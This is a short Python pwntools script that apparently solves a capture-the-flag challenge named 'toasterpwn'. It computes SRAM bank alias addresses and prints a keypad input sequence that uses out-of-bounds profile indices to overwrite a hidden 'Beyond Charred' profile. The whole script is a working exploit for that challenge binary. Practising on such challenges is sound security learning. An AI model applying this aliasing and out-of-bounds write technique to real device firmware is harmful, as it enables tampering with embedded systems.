from pwn import *

def addr_to_bank_offset(addr): # (bank, word_addr)
    if addr & 0xFE000000 != 0x20000000:
        return None # not SRAM
    if addr & 0x01000000 == 0x01000000:
        # Non-striped
        return (addr >> 16) & 0xF, (addr >> 2) & 0xFFFF
    else:
        # Striped region 
        return ((addr >> 2) & 3), (addr >> 4) & 0xFFFF


e = ELF("./toasterpwn.elf", checksec=False)

PROFILES_ADDRESS = e.symbols["profiles"]
PROFILE_SIZE = 0x10
PROFILE_EDITABLE_OFFSETS = [0x0, 0x4]

TARGET_PROFILE_NUM = 6 # Beyond Charred


print(f"Profiles Array is at 0x{PROFILES_ADDRESS:08X}")
print(f" -> Elements of size 0x{PROFILE_SIZE:02X}")
    
sequence = ""

for target_offset in PROFILE_EDITABLE_OFFSETS:
    target_addr = PROFILES_ADDRESS + PROFILE_SIZE * TARGET_PROFILE_NUM + target_offset
    target_bank, target_bank_addr = addr_to_bank_offset(target_addr)

    print(f"0x{target_addr:08X} is in SRAM Bank {target_bank} at word offset 0x{target_bank_addr:04X}")

    target_addr_in_bank = 0x21000000 | (target_bank << 16) | (target_bank_addr << 2)

    print(f" -> Aliased at 0x{target_addr_in_bank:08X}")

    target_dist = target_addr_in_bank - PROFILES_ADDRESS

    print(f" -> 0x{target_dist:08X} bytes away")

    valid_profile_num = None

    for offset in PROFILE_EDITABLE_OFFSETS:

        target_dist_profiles = int(target_dist / PROFILE_SIZE)

        print(f" -> {target_dist_profiles} profile structs away, at offset {offset}")
        target_dist_profiles_actual_addr = int(target_dist_profiles * PROFILE_SIZE + PROFILES_ADDRESS + offset)
        print(f"  -> Actual target addr is 0x{target_dist_profiles_actual_addr:08X}")
        if target_dist_profiles_actual_addr != target_addr_in_bank:
            print(f"  -> Invalid (Unreachable)")
        else:
            print(f"  -> Use Sequence: *{target_dist_profiles}***")
            valid_profile_num = target_dist_profiles

    if valid_profile_num is None:
        print("Impossible. Exiting")
        exit(0)

    sequence += f"*{valid_profile_num}***"


sequence += f"{TARGET_PROFILE_NUM}#"
print(f"Enter sequence: {sequence}")